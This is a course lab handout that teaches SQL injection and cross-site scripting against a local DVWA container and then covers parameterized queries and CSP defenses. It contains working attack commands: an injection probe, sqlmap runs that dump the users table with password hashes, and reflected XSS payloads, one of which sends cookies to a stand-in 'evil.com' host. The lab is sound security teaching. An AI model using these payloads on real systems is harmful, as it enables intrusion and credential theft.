---
title: "Lab 06 — Web Application Attacks: SQL Injection & XSS"
course: SCIA-472
week: 6
difficulty: "⭐⭐⭐"
time: "75-90 min"
---

# Lab 06 — Web Application Attacks: SQL Injection & XSS

**Course:** SCIA-472 | **Week:** 6 | **Difficulty:** ⭐⭐⭐ | **Time:** 75-90 min

---

## Overview

Web application vulnerabilities dominate breach statistics year after year — SQL injection and XSS consistently appear in the OWASP Top 10. In this lab, students use the Damn Vulnerable Web Application (DVWA) to practice manual SQL injection, automated injection with `sqlmap`, and reflected/stored/DOM Cross-Site Scripting. The second half of the lab covers defenses: parameterized queries and Content Security Policy (CSP).

---

!!! warning "Ethical Use — Read Before Proceeding"
    SQL injection and XSS attacks against systems you do not own are federal crimes under the Computer Fraud and Abuse Act (CFAA). **All attacks in this lab target only the DVWA container running on your local machine.** Never run `sqlmap` or inject payloads against any site you do not own or have explicit written authorization to test.

---

!!! tip "Grading Rubric"
    | Component | Points |
    |---|---|
    | Screenshots (8 checkpoints) | 40 pts |
    | Vulnerable vs. secure code comparison | 20 pts |
    | Reflection questions (4 × 10 pts) | 40 pts |
    | **Total** | **100 pts** |

---

## Part 1 — Lab Setup

### Step 1.1 — Start DVWA

```bash
docker network create webapp-lab
docker run -d --name dvwa --network webapp-lab -p 8888:80 vulnerables/web-dvwa
sleep 15
curl -s http://localhost:8888/ | grep -o 'DVWA\|Damn Vulnerable' | head -3
```

**Expected output:** `DVWA` or `Damn Vulnerable` confirming the application is running.

> 📸 **Screenshot 06a** — Capture the curl response confirming DVWA is running.

### Step 1.2 — Initialize the DVWA database

```bash
# Get session cookie
COOKIE=$(curl -s -c /tmp/dvwa_cookies.txt -b /tmp/dvwa_cookies.txt \
  http://localhost:8888/login.php -X POST \
  -d 'username=admin&password=password&Login=Login' -D - 2>/dev/null | \
  grep 'Set-Cookie' | grep PHPSESSID | grep -oP 'PHPSESSID=[^;]+' | head -1)
echo "Session: $COOKIE"
# Create/reset database
curl -s -b /tmp/dvwa_cookies.txt \
  'http://localhost:8888/setup.php' -X POST \
  -d 'create_db=Create+%2F+Reset+Database' > /dev/null
echo 'Database initialized'
```

> 📸 **Screenshot 06b** — Capture the terminal showing `Session: PHPSESSID=...` and `Database initialized`.

!!! note
    If the session cookie does not authenticate correctly from the command line, navigate to `http://localhost:8888` in your browser, log in as `admin` / `password`, and set the security level to **Low** via the DVWA Security menu. Then continue with Step 2.2 using the browser's developer tools to observe requests.

---

## Part 2 — Manual SQL Injection

### Step 2.1 — Test a normal query

```bash
curl -s -b 'security=low;PHPSESSID=abc123' \
  'http://localhost:8888/vulnerabilities/sqli/?id=1&Submit=Submit' | \
  grep -oE 'First name.*?<br>' | head -3
```

This retrieves user ID 1 normally. Note the output format — first name and surname from the database.

### Step 2.2 — Inject a single quote to trigger a SQL error

```bash
curl -s -b /tmp/dvwa_cookies.txt \
  "http://localhost:8888/vulnerabilities/sqli/?id=1'&Submit=Submit" 2>/dev/null | \
  grep -oi 'error\|syntax\|mysql\|warning' | head -3
```

**Expected output:** Words like `error`, `syntax`, or `mysql` — confirming the parameter is not sanitized and is injectable.

> 📸 **Screenshot 06c** — Capture the SQL error output confirming the injection point.

---

## Part 3 — Automated SQL Injection with sqlmap

### Step 3.1 — Enumerate available databases

```bash
docker run --rm --network webapp-lab ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq sqlmap 2>/dev/null
sqlmap -u 'http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='security=low;PHPSESSID=abc' \
  --level=1 --risk=1 \
  --dbms=mysql \
  --batch \
  --dbs 2>&1 | grep -E 'available databases|\[\*\]|Parameter|GET|injectable|sqlmap' | head -25"
```

**Expected output:** `Parameter 'id' is vulnerable` and a list of databases including `dvwa` and `information_schema`.

> 📸 **Screenshot 06d** — Capture sqlmap confirming the injectable parameter and listing available databases.

### Step 3.2 — Enumerate tables in the dvwa database

```bash
docker run --rm --network webapp-lab ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq sqlmap 2>/dev/null
sqlmap -u 'http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='security=low;PHPSESSID=abc' \
  --dbms=mysql \
  --batch \
  -D dvwa --tables 2>&1 | grep -E 'tables|Database|\[\*\]|guestbook|users' | head -15"
```

**Expected output:** Table names — `users` and `guestbook`.

> 📸 **Screenshot 06e** — Capture the exposed table names from the dvwa database.

### Step 3.3 — Dump user credentials

```bash
docker run --rm --network webapp-lab ubuntu:22.04 bash -c "
apt-get update -qq && apt-get install -y -qq sqlmap 2>/dev/null
sqlmap -u 'http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='security=low;PHPSESSID=abc' \
  --dbms=mysql \
  --batch \
  -D dvwa -T users --dump 2>&1 | grep -E 'user|password|admin|gordonb|\[\*\]' | head -20"
```

**Expected output:** Username and password hash rows from the `users` table (admin, gordonb, 1337, pablo, smithy with MD5 hashes).

> 📸 **Screenshot 06f** — Capture the credential dump showing usernames and password hashes.

---

## Part 4 — Cross-Site Scripting (XSS)

### Step 4.1 — Reflected XSS via curl

```bash
# Test reflected XSS in DVWA
curl -s -b 'security=low;PHPSESSID=abc' \
  "http://localhost:8888/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Search=Search" 2>/dev/null | \
  grep -o '<script>' | head -3
```

**Expected output:** `<script>` reflected back in the HTML response — confirming the application echoes input without sanitization.

> 📸 **Screenshot 06g** — Capture the XSS reflection in the response body.

### Step 4.2 — XSS type comparison

```bash
docker run --rm python:3.11-slim python3 -c "
xss_types = {
    'Reflected XSS': {
        'How it works': 'Malicious script in URL reflected immediately in response',
        'Persistence': 'Not persistent - only affects the user who clicks the link',
        'Example':     'http://site.com/search?q=<script>document.location=\"evil.com/steal?c=\"++document.cookie</script>',
        'Impact':      'Cookie theft, session hijacking, phishing',
        'DVWA test':   '/vulnerabilities/xss_r/?name=<script>alert(1)</script>',
    },
    'Stored XSS': {
        'How it works': 'Script saved to database, executes for ALL visitors',
        'Persistence': 'PERSISTENT - every page load triggers the script',
        'Example':     'Posting <script>stealCookies()</script> in a comment',
        'Impact':      'Affects ALL users, not just the one who clicks a link',
        'DVWA test':   '/vulnerabilities/xss_s/ - stored in guestbook',
    },
    'DOM XSS': {
        'How it works': 'JavaScript reads URL and writes it to DOM without sanitization',
        'Persistence': 'Client-side only, never hits the server',
        'Example':     'document.write(location.hash) without sanitization',
        'Impact':      'Bypasses server-side filtering entirely',
        'DVWA test':   '/vulnerabilities/xss_d/',
    },
}
for xss_type, details in xss_types.items():
    print(f'=== {xss_type} ===')
    for k, v in details.items():
        print(f'  {k}: {v}')
    print()
"
```

> 📸 **Screenshot 06h** — Capture the full XSS types comparison output.

---

## Part 5 — Defense: Parameterized Queries & CSP

### Step 5.1 — Secure coding patterns

```bash
docker run --rm python:3.11-slim python3 -c "
print('=== SQL INJECTION FIX ===')
print()
print('VULNERABLE (string concatenation):')
print('  query = \"SELECT * FROM users WHERE id = \" + user_input')
print('  Attack: user_input = \"1 OR 1=1--\"')
print()
print('SECURE (parameterized query):')
print('  stmt = conn.prepare(\"SELECT * FROM users WHERE id = ?\")')
print('  stmt.execute([user_input])')
print('  # user_input is treated as DATA, not SQL code')
print()
print('=== XSS FIX ===')
print()
print('VULNERABLE:')
print('  response += \"Hello \" + username  # username could contain <script>')
print()
print('SECURE:')
print('  from html import escape')
print('  response += \"Hello \" + escape(username)  # <script> becomes &lt;script&gt;')
print()
print('Content Security Policy header also prevents XSS execution:')
print(\"  Content-Security-Policy: default-src 'self'; script-src 'self'\")
"
```

> 📸 **Screenshot 06i** — Capture the defense code showing both the vulnerable pattern and the secure parameterized/escaped fix.

---

## Cleanup

```bash
docker stop dvwa && docker rm dvwa
docker network rm webapp-lab
rm -f /tmp/dvwa_cookies.txt
docker system prune -f
```

---

## Assessment — Screenshot Checklist

Submit all screenshots labeled exactly as shown:

- [ ] **06a** — DVWA running (curl response confirming `DVWA` or `Damn Vulnerable`)
- [ ] **06b** — Database initialized (`Session:` + `Database initialized`)
- [ ] **06c** — SQL error confirming injectable parameter
- [ ] **06d** — sqlmap finding available databases (`dvwa`, `information_schema`)
- [ ] **06e** — Tables exposed (`users`, `guestbook`)
- [ ] **06f** — Credential dump from `users` table (usernames + password hashes)
- [ ] **06g** — XSS reflection in HTTP response
- [ ] **06h** — XSS types comparison (Reflected / Stored / DOM)
- [ ] **06i** — Defense code (parameterized queries + CSP header)

---

## Reflection Questions

Answer each question in **150-250 words**. Submit as a separate document.

1. **Post-exploitation with hashes:** `sqlmap` dumped the `users` table including password hashes. What is the attacker's next step after obtaining these hashes? Examine the hash format in the dump — which hashing algorithm was used? Describe specifically how an attacker would crack these hashes (tool, attack type, wordlist).

2. **Stored vs. Reflected XSS severity:** Reflected XSS requires a victim to click a specially crafted link, while Stored XSS affects all visitors to the page. Why is Stored XSS considered significantly more severe? Construct a concrete real-world attack scenario where a Stored XSS vulnerability in a comment field could silently affect thousands of users over days or weeks.

3. **Why parameterized queries work:** The parameterized query fix ensures user input is treated as data, not SQL code. Explain at the **database engine level** what happens differently — what does the database server do during the prepare phase vs. the execute phase? Why does this separation make injection structurally impossible rather than just filtered?

4. **Input validation limitations:** A web developer argues that using input validation (rejecting anything that is not alphanumeric) is sufficient to prevent SQL injection and they do not need parameterized queries. Is this argument correct? Describe a realistic scenario — such as an internationalized application, a search field, or a specific character set — where input validation can be bypassed but parameterized queries cannot.

---

*SCIA-472 | Week 6 | All activity confined to local Docker environment*
